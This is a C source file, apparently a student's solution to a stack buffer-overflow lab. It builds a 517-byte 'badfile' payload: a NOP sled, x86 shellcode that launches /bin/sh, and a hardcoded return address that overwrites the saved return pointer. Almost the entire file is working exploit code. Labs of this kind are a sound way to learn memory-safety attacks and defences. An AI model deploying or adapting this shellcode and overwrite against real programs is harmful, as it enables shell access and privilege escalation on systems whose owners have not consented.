/* exploit.c  */

/* A program that creates a file containing code for launching shell*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char shellcode[] = "\x31\xc0" /* xorl    %eax,%eax              */
                   "\x50"     /* pushl   %eax                   */
                   "\x68"
                   "//sh" /* pushl   $0x68732f2f            */
                   "\x68"
                   "/bin"     /* pushl   $0x6e69622f            */
                   "\x89\xe3" /* movl    %esp,%ebx              */
                   "\x50"     /* pushl   %eax                   */
                   "\x53"     /* pushl   %ebx                   */
                   "\x89\xe1" /* movl    %esp,%ecx              */
                   "\x99"     /* cdq                            */
                   "\xb0\x0b" /* movb    $0x0b,%al              */
                   "\xcd\x80" /* int     $0x80                  */
    ;

void main(int argc, char **argv) {
  char buffer[517];
  FILE *badfile;

  /* Initialize buffer with 0x90 (NOP instruction) */
  memset(&buffer, 0x90, 517);

  /* START OF MY CODE */

  int lenOfShell = strlen(shellcode);
  int buffer_start = 0xbfffe9b8;
  int buffer_end = 0xbfffe9d8;
  int return_address_offset = buffer_end - buffer_start + 4;

  memcpy(buffer + 517 - lenOfShell, shellcode, lenOfShell);

  int return_address = buffer_start + return_address_offset + 100;

  memcpy(buffer + return_address_offset, &return_address,
         sizeof(return_address));

  /* END OF MY CODE */

  /* Save the contents to the file "badfile" */
  badfile = fopen("./badfile", "w");
  fwrite(buffer, 517, 1, badfile);
  fclose(badfile);
}
